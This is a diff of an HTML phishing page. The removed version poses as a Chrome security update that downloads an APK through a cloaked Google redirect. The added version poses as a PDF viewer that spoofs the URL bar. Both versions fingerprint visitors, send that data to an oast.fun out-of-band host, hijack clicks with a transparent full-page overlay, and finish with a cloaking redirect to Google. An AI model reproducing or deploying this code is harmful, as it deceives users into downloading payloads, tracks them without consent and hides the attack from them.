@@ -1,72 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Chrome Security Update</title>
+  <meta charset="UTF-8">
+  <title>Chrome PDF Report Viewer</title>
   <style>
-    body { font-family: sans-serif; padding: 40px; text-align: center; }
-    #update-btn {
-      background: #4CAF50;
-      color: white;
-      font-size: 20px;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      position: relative;
-      z-index: 9999;
-    }
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    .fake-url { background: #f1f3f4; padding: 10px; font-size: 14px; border-bottom: 1px solid #ccc; }
     .overlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 9999;
       background: transparent;
-      z-index: 10000;
     }
   </style>
 </head>
 <body>
-
-  <h2>🔒 Chrome Update Required</h2>
-  <p>Your system may be at risk. Please click "Update Now" to install the latest security patch.</p>
-  <button id="update-btn">Update Now</button>
+  <div class="fake-url"><b>https://www.google.com/search?q=monthly+report+2025.pdf</b></div>
+  <h2>📄 Secure PDF Viewer</h2>
+  <p>Rendering Document...</p>
 
   <script>
-    // === 1. Fingerprint
-    const fp = {
-      ua: navigator.userAgent,
-      lang: navigator.language,
-      screen: screen.width + "x" + screen.height,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+    // Spoof URL bar
+    history.pushState({}, '', '/search?q=monthly+report+2025.pdf');
 
-    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/fingerprint", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(fp)
-    });
+    // 1. Click overlay for hijack
+    const overlay = document.createElement('div');
+    overlay.className = 'overlay';
+    overlay.onclick = () => {
+      // 2. Fingerprint
+      const fp = {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: screen.width + 'x' + screen.height
+      };
 
-    // === 2. Click Hijack Overlay
-    const overlay = document.createElement("div");
-    overlay.className = "overlay";
-    overlay.onclick = function () {
-      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/clicked", {
-        method: "POST",
-        body: JSON.stringify({ clicked: true, ts: Date.now() }),
-        headers: { "Content-Type": "application/json" }
+      // 3. Send fingerprint
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/fp', {
+        method: 'POST',
+        body: JSON.stringify(fp),
+        headers: { 'Content-Type': 'application/json' }
       });
 
-      // 3. Trigger download via Google redirect cloak
-      const a = document.createElement("a");
-      a.href = "https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D";
-      a.download = "ChromeSecurityUpdate.apk";
+      // 4. Simulate file download
+      const blob = new Blob(["<h1>Deceptive Report</h1>"], { type: "text/html" });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = "Monthly_Report_2025.html"; // deceptive .html
       document.body.appendChild(a);
       a.click();
 
-      // 4. Cloaking redirect
+      // 5. Cloaking redirect
       setTimeout(() => {
-        location.href = "https://www.google.com/search?q=chrome+update";
+        location.href = "https://www.google.com/search?q=chrome+security+patch";
       }, 1000);
     };
-
     document.body.appendChild(overlay);
   </script>
 </body>
